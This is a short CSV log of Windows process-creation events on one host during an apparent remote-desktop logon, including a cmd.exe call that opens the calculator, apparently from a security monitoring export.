Timestamp,DeviceName,AccountName,FileName,ProcessCommandLine,InitiatingProcessFileName,InitiatingProcessCommandLine,RemoteIP
"Sep 16, 2025 2:43:48 PM",slflarewinsysmo,slflare,TSTheme.exe,TSTheme.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:43:48 PM",slflarewinsysmo,slflare,rdpclip.exe,rdpclip,svchost.exe,svchost.exe -k NetworkService,159.26.106.84
"Sep 16, 2025 2:43:49 PM",slflarewinsysmo,slflare,sihost.exe,sihost.exe,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:43:50 PM",slflarewinsysmo,slflare,svchost.exe,svchost.exe -k UnistackSvcGroup,services.exe,services.exe,159.26.106.84
"Sep 16, 2025 2:43:51 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c calc.exe",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:43:51 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe USER,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:43:51 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:43:51 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:43:52 PM",slflarewinsysmo,slflare,ctfmon.exe,ctfmon.exe,svchost.exe,svchost.exe -k LocalSystemNetworkRestricted -p,159.26.106.84
"Sep 16, 2025 2:43:54 PM",slflarewinsysmo,slflare,userinit.exe,userinit.exe,winlogon.exe,winlogon.exe,159.26.106.84
"Sep 16, 2025 2:43:55 PM",slflarewinsysmo,slflare,explorer.exe,Explorer.EXE,userinit.exe,userinit.exe,159.26.106.84
"Sep 16, 2025 2:44:00 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /c calc.exe",159.26.106.84
"Sep 16, 2025 2:44:10 PM",slflarewinsysmo,slflare,svchost.exe,svchost.exe -k ClipboardSvcGroup -p,services.exe,services.exe,159.26.106.84
"Sep 16, 2025 2:44:11 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:12 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
